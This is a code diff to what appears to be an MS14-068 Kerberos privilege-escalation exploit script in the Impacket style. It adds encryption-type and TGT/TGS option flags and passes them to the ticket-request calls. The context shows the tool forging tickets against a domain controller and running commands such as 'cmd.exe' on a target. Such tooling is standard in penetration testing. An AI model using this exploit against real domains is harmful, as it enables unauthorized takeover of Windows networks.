@@ -433,7 +433,7 @@ class MS14_068:
         )
 
     def __init__(self, target, targetIp=None, username='', password='', domain='', hashes=None, command='',
-                 copyFile=None, writeTGT=None, kdcHost=None):
+                 copyFile=None, writeTGT=None, kdcHost=None, encType=None, tgtOptions=None, tgsOptions=None):
         self.__username = username
         self.__password = password
         self.__domain = domain
@@ -450,6 +450,9 @@ class MS14_068:
         self.__forestSid = None
         self.__domainControllers = list()
         self.__kdcHost = kdcHost
+        self.__encryption = encType
+        self.__tgtOptions = parseKerberosOptions(tgtOptions)
+        self.__tgsOptions = parseKerberosOptions(tgsOptions)
 
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split(':')
@@ -936,7 +939,7 @@ class MS14_068:
                 try:
                     tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                             self.__lmhash, self.__nthash, None,
-                                                                            self.__kdcHost, requestPAC=False)
+                                                                            self.__kdcHost, requestPAC=False, encType=self.__encryption, options=self.__tgtOptions)
                 except KerberosError as e:
                     if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                         # We might face this if the target does not support AES (most probably
@@ -991,7 +994,7 @@ class MS14_068:
                 try:
                     tgsCIFS, cipher, oldSessionKeyCIFS, sessionKeyCIFS = getKerberosTGS(serverName, domain,
                                                                                         self.__kdcHost, tgs, cipher,
-                                                                                        sessionKey)
+                                                                                        sessionKey, encType=self.__encryption, options=self.__tgsOptions)
                 except KerberosError as e:
                     if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                         # We might face this if the target does not support AES (most probably
@@ -1060,7 +1063,7 @@ if __name__ == '__main__':
     from impacket.dcerpc.v5 import transport
     from impacket.krb5.types import Principal, Ticket, KerberosTime
     from impacket.krb5 import constants
-    from impacket.krb5.kerberosv5 import sendReceive, getKerberosTGT, getKerberosTGS, KerberosError
+    from impacket.krb5.kerberosv5 import sendReceive, getKerberosTGT, getKerberosTGS, KerberosError, parseKerberosOptions
     from impacket.krb5.asn1 import AS_REP, TGS_REQ, AP_REQ, TGS_REP, Authenticator, EncASRepPart, AuthorizationData, \
         AD_IF_RELEVANT, seq_set, seq_set_iter, KERB_PA_PAC_REQUEST, \
         EncTGSRepPart, ETYPE_INFO2_ENTRY
@@ -1097,6 +1100,13 @@ if __name__ == '__main__':
     group = parser.add_argument_group('authentication')
 
     group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
+
+    kerberos_options = parser.add_argument_group('kerberos options')
+
+    kerberos_options.add_argument('-tgs-options', action="store", metavar="hex value", default=None, help='The hexadecimal value to send to the Kerberos Ticket Granting Service (TGS).')
+    kerberos_options.add_argument('-tgt-options', action="store", metavar="hex value", default=None, help='The hexadecimal value to send to the Kerberos Ticket Granting Ticket (TGT).')
+    kerberos_options.add_argument('-encryption', action="store", metavar="18 or 23", default="23", help='Set encryption to AES256 (18) or RC4 (23).')
+
     if len(sys.argv)==1:
         parser.print_help()
         print("\nExamples: ")
@@ -1137,7 +1147,7 @@ if __name__ == '__main__':
         commands = 'cmd.exe'
 
     dumper = MS14_068(address, options.target_ip, username, password, domain, options.hashes, commands, options.c,
-                      options.w, options.dc_ip)
+                      options.w, options.dc_ip, options.encryption, options.tgt_options, options.tgs_options)
 
     try:
         dumper.exploit()
